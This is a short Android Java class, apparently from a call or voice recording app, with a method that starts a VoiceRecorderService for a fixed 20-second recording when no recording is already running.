package AutoVoiceRecorder;

import static AutoCallRecorder.Constants.TAG;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import UiActivities.MainActivity;
import synceAdapter.AccountConstants;

public class recorderClass {
    public static void startRecording(Context context , int t){
        boolean flag = AccountConstants.isaudioRecording;
        if (!flag){
            try {
                Intent intent = new Intent(context.getApplicationContext() , VoiceRecorderService.class);
                intent.putExtra("isRecording" , true);
                intent.putExtra("time" , 20000);
                context.startService(intent);
            }catch (Exception e){}
        }
    }
}
